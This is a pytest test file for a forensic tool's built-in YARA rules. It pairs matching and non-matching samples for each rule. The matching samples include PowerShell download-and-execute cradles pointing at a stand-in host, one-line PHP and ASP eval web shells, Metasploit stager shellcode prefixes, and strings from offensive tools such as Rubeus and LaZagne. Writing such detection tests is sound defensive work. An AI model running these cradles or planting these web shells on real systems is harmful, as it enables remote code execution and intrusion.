import pytest

from investigation.modules.parsers.yara_scan import BUILTIN_RULES

yara = pytest.importorskip("yara")

CS_PLAIN = bytes.fromhex("000100010002") + b"\x04\x00" + bytes.fromhex("0002000100020400") + bytes.fromhex("000300020004") + b"\x00\x01"
CS_XOR = bytes(b ^ 0x2E for b in CS_PLAIN)

POSITIVE = {
    "INV_PowerShell_Download_Cradle": [
        b"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')",
        b"iwr http://x/a.ps1 -UseBasicParsing | iex",
        b"powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA ; $w.DownloadData('http://x')",
    ],
    "INV_CobaltStrike_Beacon_Config": [b"MZ" + b"\x00" * 40 + CS_PLAIN, b"MZ" + CS_XOR],
    "INV_Sliver_Implant": [b"\x7fELF github.com/bishopfox/sliver/protobuf/sliverpb.Envelope"],
    "INV_Metasploit_Stager": [
        bytes.fromhex("fce8820000006089e531c0648b50308b520c8b5214"),
        bytes.fromhex("fc4883e4f0e8c8000000415141505251564831d2"),
        b"metsrv.dll ... ReflectiveLoader",
    ],
    "INV_Webshell_ChinaChopper": [
        b'<%eval request("pass")%>',
        b"<?php @eval($_POST['x']);?>",
        b'<%@ Page Language="Jscript"%><%eval(Request.Item["z"],"unsafe");%>',
    ],
    "INV_Webshell_b374k": [b"<?php // b374k shell 3.2 \n $x = shell_exec($c);"],
    "INV_LaZagne": [b"The LaZagne Project by AlessandroZ lazagne.softwares.browsers"],
    "INV_Rubeus": [b"Rubeus.Program asktgt /user:x /ptt"],
    "INV_SharpHound": [b"SharpHound CollectionMethod DCOnly BloodHound"],
    "INV_Seatbelt": [b"Seatbelt GhostPack -group=all"],
    "INV_Ransom_Note_Patterns": [b"Your files have been encrypted. Pay in Bitcoin to get the decryptor."],
}

BENIGN = {
    "INV_PowerShell_Download_Cradle": [
        b"Invoke-WebRequest -Uri https://example.com/file.zip -OutFile file.zip",
        b"iwr https://example.com | Select-Object StatusCode",
        b"$s = 'DownloadString' # documentation only",
    ],
    "INV_CobaltStrike_Beacon_Config": [b"just some text " * 50, bytes(range(256)) * 4],
    "INV_Sliver_Implant": [b"github.com/bishopfox/other-project"],
    "INV_Metasploit_Stager": [b"ReflectiveLoader in a security blog post", b"MZ" + b"\x90" * 100],
    "INV_Webshell_ChinaChopper": [b"<?php echo eval_helper($data); ?>", b"<% Response.Write(Request(\"q\")) %>"],
    "INV_Webshell_b374k": [b"<?php echo 'hello'; ?>", b"notes about b374k without code"],
    "INV_LaZagne": [b"lazagne is a nice word", b"AlessandroZ profile"],
    "INV_Rubeus": [b"Rubeus Hagrid is a character", b"asktgt alone"],
    "INV_SharpHound": [b"BloodHound is a dog breed", b"SharpHound"],
    "INV_Seatbelt": [b"Fasten your seatbelt", b"GhostPack"],
    "INV_Ransom_Note_Patterns": [b"Bitcoin price report for the quarter", b"Your files have been uploaded"],
}


@pytest.fixture(scope="module")
def rules():
    return yara.compile(filepath=str(BUILTIN_RULES / "builtin.yar"), externals={"filepath": ""})


def matched(rules, data, path=""):
    return {m.rule for m in rules.match(data=data, externals={"filepath": path})}


@pytest.mark.parametrize("rule,data", [(r, d) for r, ds in POSITIVE.items() for d in ds])
def test_rule_matches_its_sample(rules, rule, data):
    assert rule in matched(rules, data)


@pytest.mark.parametrize("rule,data", [(r, d) for r, ds in BENIGN.items() for d in ds])
def test_rule_ignores_benign_sample(rules, rule, data):
    assert rule not in matched(rules, data)


def test_cradle_not_applied_to_psreadline_history(rules):
    cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
    path = "Users/a/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
    assert "INV_PowerShell_Download_Cradle" not in matched(rules, cradle, path)
    assert "INV_PowerShell_Download_Cradle" in matched(rules, cradle, "Users/a/Downloads/x.ps1")


def test_all_rule_names_use_prefix(rules):
    text = (BUILTIN_RULES / "builtin.yar").read_text()
    import re

    assert all(n.startswith("INV_") for n in re.findall(r"^rule (\w+)", text, re.M))
